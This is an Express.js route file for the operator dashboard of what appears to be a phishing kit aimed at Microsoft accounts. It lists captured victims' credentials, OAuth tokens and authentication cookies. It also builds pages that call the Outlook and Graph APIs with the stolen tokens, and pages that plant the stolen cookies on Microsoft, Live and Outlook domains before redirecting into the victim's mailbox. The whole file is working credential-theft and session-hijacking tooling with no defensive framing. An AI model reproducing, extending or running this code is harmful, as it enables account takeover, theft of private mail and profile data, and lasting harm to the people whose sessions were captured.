// routes/dash.js
const express = require('express');
const router = express.Router();
const path = require('path');
const fs = require('fs');

// Store captured data reference
let capturedData;
let emailSessions;

function initRoutes(dependencies) {
    capturedData = dependencies.capturedData;
    emailSessions = dependencies.emailSessions;
}

// dash home page
router.get('/dash', (req, res) => {
    res.sendFile(path.join(__dirname, '../html/dash.html'));
});

// API endpoint to get all sessions
router.get('/api/sessions', (req, res) => {
    const sessions = [];
    
    for (const [sessionId, session] of capturedData.entries()) {
        const emailSession = emailSessions.get(sessionId);
        const email = emailSession?.decrypted || session.credentials?.username || 'Unknown';
        
        sessions.push({
            sessionId: sessionId,
            email: email,
            credentials: session.credentials || null,
            tokens: session.tokens || null,
            cookies: session.cookies || [],
            capturedAt: session.credentials?.time || session.cookies[0]?.captured_at || new Date().toISOString()
        });
    }
    
    // Sort by most recent first
    sessions.sort((a, b) => new Date(b.capturedAt) - new Date(a.capturedAt));
    
    res.json(sessions);
});

// API endpoint to get session details
router.get('/api/session/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const session = capturedData.get(sessionId);
    
    if (!session) {
        return res.status(404).json({ error: 'Session not found' });
    }
    
    const emailSession = emailSessions.get(sessionId);
    const email = emailSession?.decrypted || session.credentials?.username || 'Unknown';
    
    res.json({
        sessionId: sessionId,
        email: email,
        credentials: session.credentials || null,
        tokens: session.tokens || null,
        cookies: session.cookies || [],
        capturedAt: session.credentials?.time || session.cookies[0]?.captured_at
    });
});

// API endpoint to get session cookies
router.get('/api/session/:sessionId/cookies', (req, res) => {
    const { sessionId } = req.params;
    const session = capturedData.get(sessionId);
    
    if (!session) {
        return res.status(404).json({ error: 'Session not found' });
    }
    
    // Filter to only return auth cookies
    const authCookies = session.cookies.filter(c => c.is_auth_cookie === true);
    const regularCookies = session.cookies.filter(c => c.is_auth_cookie !== true);
    
    res.json({
        sessionId: sessionId,
        authCookies: authCookies,
        regularCookies: regularCookies,
        total: session.cookies.length
    });
});

// API endpoint to load /dash with tokens
router.post('/api/load-/dash', express.json(), async (req, res) => {
    const { sessionId, tokenType } = req.body;
    const session = capturedData.get(sessionId);
    
    if (!session || !session.tokens) {
        return res.status(404).json({ error: 'Session or tokens not found' });
    }
    
    let token = null;
    if (tokenType === 'outlook') {
        token = session.tokens.outlook?.access_token;
    } else if (tokenType === 'graph') {
        token = session.tokens.graph?.access_token;
    }
    
    if (!token) {
        return res.status(404).json({ error: 'Token not found' });
    }
    
    // Return a /dash HTML that will use the token
    const dashHtml = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Microsoft dash - ${sessionId}</title>
            <meta charset="UTF-8">
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }
                body {
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
                    background: #f5f5f5;
                    padding: 20px;
                }
                .header {
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    padding: 20px;
                    border-radius: 10px;
                    margin-bottom: 20px;
                }
                .container {
                    max-width: 1400px;
                    margin: 0 auto;
                }
                .grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                    gap: 20px;
                    margin-bottom: 20px;
                }
                .card {
                    background: white;
                    border-radius: 10px;
                    padding: 20px;
                    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                }
                .card h3 {
                    margin-bottom: 15px;
                    color: #333;
                    border-bottom: 2px solid #667eea;
                    padding-bottom: 10px;
                }
                .token-info {
                    background: #f8f9fa;
                    padding: 10px;
                    border-radius: 5px;
                    font-family: monospace;
                    font-size: 12px;
                    word-break: break-all;
                    margin-top: 10px;
                }
                button {
                    background: #667eea;
                    color: white;
                    border: none;
                    padding: 10px 20px;
                    border-radius: 5px;
                    cursor: pointer;
                    font-size: 14px;
                    margin-top: 10px;
                }
                button:hover {
                    background: #5a67d8;
                }
                .success {
                    color: green;
                    margin-top: 10px;
                }
                .error {
                    color: red;
                    margin-top: 10px;
                }
                table {
                    width: 100%;
                    border-collapse: collapse;
                }
                th, td {
                    padding: 8px;
                    text-align: left;
                    border-bottom: 1px solid #ddd;
                }
                .cookie-value {
                    font-family: monospace;
                    font-size: 11px;
                    word-break: break-all;
                    max-width: 300px;
                }
                .auth-badge {
                    background: #4CAF50;
                    color: white;
                    padding: 2px 6px;
                    border-radius: 3px;
                    font-size: 10px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>Microsoft dash</h1>
                    <p>Session: ${sessionId}</p>
                    <p>Token Type: ${tokenType.toUpperCase()}</p>
                </div>
                
                <div class="grid">
                    <div class="card">
                        <h3>📧 Outlook API</h3>
                        <div class="token-info">
                            <strong>Access Token:</strong><br>
                            ${session.tokens.outlook?.access_token?.substring(0, 100)}...
                        </div>
                        <button onclick="testOutlookAPI()">Test Outlook API</button>
                        <div id="outlook-result"></div>
                    </div>
                    
                    <div class="card">
                        <h3>🔄 Graph API</h3>
                        <div class="token-info">
                            <strong>Access Token:</strong><br>
                            ${session.tokens.graph?.access_token?.substring(0, 100)}...
                        </div>
                        <button onclick="testGraphAPI()">Test Graph API</button>
                        <div id="graph-result"></div>
                    </div>
                    
                    <div class="card">
                        <h3>👤 Profile Info</h3>
                        <button onclick="getProfile()">Get Profile</button>
                        <div id="profile-result"></div>
                    </div>
                </div>
                
                <div class="card">
                    <h3>🍪 Authentication Cookies (${session.cookies.filter(c => c.is_auth_cookie).length} auth cookies)</h3>
                    <table>
                        <thead>
                            <tr><th>Name</th><th>Value</th><th>Source</th></tr>
                        </thead>
                        <tbody>
                            ${session.cookies.filter(c => c.is_auth_cookie).map(cookie => `
                                <tr>
                                    <td><strong>${cookie.name}</strong> <span class="auth-badge">AUTH</span></td>
                                    <td class="cookie-value">${cookie.value.substring(0, 100)}...</td>
                                    <td>${cookie.source || 'Unknown'}</td>
                                </tr>
                            `).join('')}
                        </tbody>
                    </table>
                </div>
            </div>
            
            <script>
                const token = '${token}';
                
                async function testOutlookAPI() {
                    const resultDiv = document.getElementById('outlook-result');
                    resultDiv.innerHTML = 'Loading...';
                    
                    try {
                        const response = await fetch('https://outlook.office.com/api/v2.0/me', {
                            headers: {
                                'Authorization': 'Bearer ' + token
                            }
                        });
                        
                        if (response.ok) {
                            const data = await response.json();
                            resultDiv.innerHTML = '<div class="success">✅ Outlook API Working!<br><pre>' + JSON.stringify(data, null, 2) + '</pre></div>';
                        } else {
                            resultDiv.innerHTML = '<div class="error">❌ Error: ' + response.status + '</div>';
                        }
                    } catch (error) {
                        resultDiv.innerHTML = '<div class="error">❌ Error: ' + error.message + '</div>';
                    }
                }
                
                async function testGraphAPI() {
                    const resultDiv = document.getElementById('graph-result');
                    resultDiv.innerHTML = 'Loading...';
                    
                    try {
                        const response = await fetch('https://graph.microsoft.com/v1.0/me', {
                            headers: {
                                'Authorization': 'Bearer ' + token
                            }
                        });
                        
                        if (response.ok) {
                            const data = await response.json();
                            resultDiv.innerHTML = '<div class="success">✅ Graph API Working!<br><pre>' + JSON.stringify(data, null, 2) + '</pre></div>';
                        } else {
                            resultDiv.innerHTML = '<div class="error">❌ Error: ' + response.status + '</div>';
                        }
                    } catch (error) {
                        resultDiv.innerHTML = '<div class="error">❌ Error: ' + error.message + '</div>';
                    }
                }
                
                async function getProfile() {
                    const resultDiv = document.getElementById('profile-result');
                    resultDiv.innerHTML = 'Loading...';
                    
                    try {
                        const response = await fetch('https://graph.microsoft.com/v1.0/me', {
                            headers: {
                                'Authorization': 'Bearer ' + token
                            }
                        });
                        
                        if (response.ok) {
                            const data = await response.json();
                            resultDiv.innerHTML = '<div class="success">✅ Profile Data:<br><pre>' + JSON.stringify(data, null, 2) + '</pre></div>';
                        } else {
                            resultDiv.innerHTML = '<div class="error">❌ Error: ' + response.status + '</div>';
                        }
                    } catch (error) {
                        resultDiv.innerHTML = '<div class="error">❌ Error: ' + error.message + '</div>';
                    }
                }
            </script>
        </body>
        </html>
    `;
    
    res.send(dashHtml);
});

// API endpoint to login with cookies
router.post('/api/login-with-cookies', express.json(), async (req, res) => {
    const { sessionId } = req.body;
    const session = capturedData.get(sessionId);
    
    if (!session || !session.cookies) {
        return res.status(404).json({ error: 'Session or cookies not found' });
    }
    
    // Get auth cookies
    const authCookies = session.cookies.filter(c => c.is_auth_cookie === true);
    
    if (authCookies.length === 0) {
        return res.status(404).json({ error: 'No authentication cookies found' });
    }
    
    // Format cookies for browser
    const cookieString = authCookies.map(c => `${c.name}=${c.value}`).join('; ');
    
    // Return a page that will set the cookies and redirect
    const cookieLoginHtml = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Login with Cookies</title>
            <style>
                body {
                    font-family: monospace;
                    padding: 20px;
                    text-align: center;
                }
                .success {
                    color: green;
                    margin: 20px;
                }
                .cookies {
                    background: #f5f5f5;
                    padding: 20px;
                    border-radius: 5px;
                    text-align: left;
                    margin: 20px;
                    font-size: 12px;
                    word-break: break-all;
                }
            </style>
        </head>
        <body>
            <h1>Cookie Authentication</h1>
            <div class="success">✅ Setting authentication cookies...</div>
            <div class="cookies">
                <strong>Setting cookies:</strong><br>
                ${authCookies.map(c => `${c.name}=${c.value.substring(0, 100)}...`).join('<br>')}
            </div>
            <div id="status">Redirecting to Outlook in 3 seconds...</div>
            
            <script>
                // Set cookies
                ${authCookies.map(c => `
                    document.cookie = "${c.name}=${c.value}; path=/; domain=.microsoft.com";
                    document.cookie = "${c.name}=${c.value}; path=/; domain=.live.com";
                    document.cookie = "${c.name}=${c.value}; path=/; domain=.outlook.com";
                `).join('')}
                
                // Redirect to Outlook
                setTimeout(() => {
                    window.location.href = 'https://outlook.live.com/mail/';
                }, 3000);
            </script>
        </body>
        </html>
    `;
    
    res.send(cookieLoginHtml);
});

module.exports = { router, initRoutes };